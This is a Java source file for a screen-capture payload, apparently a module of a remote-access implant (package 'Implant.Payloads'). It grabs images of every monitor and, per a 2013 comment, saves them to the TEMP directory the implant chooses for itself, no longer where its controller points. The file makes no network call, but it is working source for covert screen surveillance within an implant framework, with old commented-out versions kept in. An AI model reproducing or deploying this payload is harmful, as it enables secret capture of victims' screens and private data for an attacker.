/**
 * This code is written to capture frames from the screen
 * 
 * @author Solomon Sonya
 */

package Implant.Payloads;

import java.awt.*;
import java.awt.image.*;
import java.io.*;
import java.util.ArrayList;

import javax.*;
import javax.imageio.ImageIO;

import Implant.Driver;



public class CaptureScreen 
{
	static String strMyClassName = "CaptureScreen";
	
	
	//original code
	/*public static File captureScreen(String screenImgSavePath, String fileNameWithoutExtension, boolean hideExtensionFromOutput)
	{
		File fleToReturn = null;
		
		try
		{
			String outFile = "";
			
			
			if(screenImgSavePath == null || screenImgSavePath.trim().equals(""))
			{
				screenImgSavePath = "." + Driver.fileSeperator; 
			}
			
			if(hideExtensionFromOutput)
			{
				outFile = fileNameWithoutExtension;
			}
			else
			{
				outFile = fileNameWithoutExtension + "." + Driver.extension;
			}
			
			fleToReturn = new File(screenImgSavePath, outFile);
			
			Rectangle rectScreen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage imgCapture = new Robot().createScreenCapture(rectScreen);
			ImageIO.write(imgCapture, Driver.extension, fleToReturn); 
			
			//Get mult screens
			GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
			GraphicsDevice [] arrScreens = ge.getScreenDevices();
			if(arrScreens != null && arrScreens.length > 0)
			{
				for(int i = 0; i < arrScreens.length; i++)
				{
					Robot robot = new Robot(arrScreens[i]);
					Rectangle screenBounds = arrScreens[i].getDefaultConfiguration().getBounds();
					//normalize bounds
					screenBounds.x = 0; screenBounds.y = 0;
					//Take screen capture
					BufferedImage imgScreenCapture = robot.createScreenCapture(screenBounds);
					
					outFile = "" + i + "_" + fileNameWithoutExtension + "." + Driver.extension;
					
					ImageIO.write(imgScreenCapture, Driver.extension, new File(screenImgSavePath, outFile));
				}
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("captureScreen", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return fleToReturn;
	}*/
	
	public static File captureScreen(String screenImgSavePath, String fileNameWithoutExtension)
	{
		try
		{
			if(screenImgSavePath == null || screenImgSavePath.trim().equals(""))
			{
				screenImgSavePath = "." + Driver.fileSeperator; 
			}
			
			
			
			File fleCaptureFile = new File( screenImgSavePath, fileNameWithoutExtension + "." + Driver.CAPTURE_SCREEN_FILE_EXTENSION_WITHOUT_DOT);
			
			Rectangle rectScreen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage imgCapture = new Robot().createScreenCapture(rectScreen);
			//ImageIO.write(imgCapture, "png", new File( screenImgSavePath, fileNameWithoutExtension + "." + "png")); 
			ImageIO.write(imgCapture, Driver.CAPTURE_SCREEN_FILE_EXTENSION_WITHOUT_DOT, fleCaptureFile);
			
			return fleCaptureFile;
		}
		catch(Exception e)
		{
			Driver.eop("screenImgSavePath", "Drivers - Controller", e, e.getLocalizedMessage(), false);
		}
		
		//try to save the file to the current working directory, perhaps that will help
		try
		{
			//if(screenImgSavePath == null || screenImgSavePath.trim().equals(""))
			//{
				screenImgSavePath = "." + Driver.fileSeperator; 
			//}
			
			File fleCaptureFile = new File( screenImgSavePath, fileNameWithoutExtension + "." + Driver.CAPTURE_SCREEN_FILE_EXTENSION_WITHOUT_DOT);
			
			Rectangle rectScreen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage imgCapture = new Robot().createScreenCapture(rectScreen);
			ImageIO.write(imgCapture, Driver.CAPTURE_SCREEN_FILE_EXTENSION_WITHOUT_DOT, new File( screenImgSavePath, fileNameWithoutExtension + "." + Driver.CAPTURE_SCREEN_FILE_EXTENSION_WITHOUT_DOT)); 
			
			
			return fleCaptureFile;
		}
		catch(Exception ee)
		{
			Driver.sop("Second attempt to save file at current working directory was unsuccessful as well");
		}
		
		return null;
	}
	
	public static ArrayList<File> captureScreens(String screenImgSavePath, String fileNameWithoutExtension)
	{
		ArrayList<File> alScreenCaptureHandles = new ArrayList<File>();
		
		try
		{
			String outFile = "";
			File fleToReturn = null; 
						
			//Get mult screens
			GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
			GraphicsDevice [] arrScreens = ge.getScreenDevices();
			
			//index through screens
			if(arrScreens != null && arrScreens.length > 0)
			{
				for(int i = 0; i < arrScreens.length; i++)
				{
					Robot robot = new Robot(arrScreens[i]);
					Rectangle screenBounds = arrScreens[i].getDefaultConfiguration().getBounds();
					
					//normalize bounds
					screenBounds.x = 0; screenBounds.y = 0;
					
					//Take screen capture
					BufferedImage imgScreenCapture = robot.createScreenCapture(screenBounds);
					
					outFile = "" + i + "_" + fileNameWithoutExtension + "." + Driver.extension;
					
					//try to save in temp directory
					try
					{
						//fleToReturn = new File(screenImgSavePath, outFile);

						//yeah... so as of 11 sep 13, i am going to change from the controller dictating screenImgSavePath where the save path to be... to us choosing it ourselves
						
						screenImgSavePath = Driver.systemMap.strTEMP;
						
						if(screenImgSavePath.endsWith(Driver.fileSeperator) || outFile.startsWith(Driver.fileSeperator))
						{
							fleToReturn = new File(screenImgSavePath + outFile);
						}
						else
						{
							fleToReturn = new File(screenImgSavePath + Driver.fileSeperator + outFile);
						}
						
						
						//Driver.sop("Attempting to write to file: " + fleToReturn.getCanonicalPath());
						ImageIO.write(imgScreenCapture, Driver.extension, fleToReturn);
					}
					catch(Exception e)
					{
						//else, try and save in current working directory (launch path)
						fleToReturn = new File("." + Driver.fileSeperator, outFile);
						ImageIO.write(imgScreenCapture, Driver.extension, fleToReturn);
					}
					
					
					/*if(fleToReturn == null || !fleToReturn.exists())
					{
						fleToReturn = new File("." + Driver.fileSeperator, outFile);
					}*/
					
					
					
					//successful [makes it here, store in arraylist]
					alScreenCaptureHandles.add(fleToReturn);
				}
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("captureScreens", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return alScreenCaptureHandles;
	}

	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	/**** working code:
	 * public static File captureScreen(String screenImgSavePath, String fileNameWithoutExtension)
	{
		try
		{
			if(screenImgSavePath == null || screenImgSavePath.trim().equals(""))
			{
				screenImgSavePath = "." + Driver.fileSeperator; 
			}
			
			
			
			File fleCaptureFile = new File( screenImgSavePath, fileNameWithoutExtension + "." + "png");
			
			Rectangle rectScreen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage imgCapture = new Robot().createScreenCapture(rectScreen);
			//ImageIO.write(imgCapture, "png", new File( screenImgSavePath, fileNameWithoutExtension + "." + "png")); 
			ImageIO.write(imgCapture, "png", fleCaptureFile);
			
			return fleCaptureFile;
		}
		catch(Exception e)
		{
			Driver.eop("screenImgSavePath", "Drivers - Controller", e, e.getLocalizedMessage(), false);
		}
		
		//try to save the file to the current working directory, perhaps that will help
		try
		{
			//if(screenImgSavePath == null || screenImgSavePath.trim().equals(""))
			//{
				screenImgSavePath = "." + Driver.fileSeperator; 
			//}
			
			File fleCaptureFile = new File( screenImgSavePath, fileNameWithoutExtension + "." + "png");
			
			Rectangle rectScreen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage imgCapture = new Robot().createScreenCapture(rectScreen);
			ImageIO.write(imgCapture, "png", new File( screenImgSavePath, fileNameWithoutExtension + "." + "png")); 
			
			
			return fleCaptureFile;
		}
		catch(Exception ee)
		{
			Driver.sop("Second attempt to save file at current working directory was unsuccessful as well");
		}
		
		return null;
	}
	 * 
	 * 
	 * 
	 * 
	 */
	
	
	
	
	
}
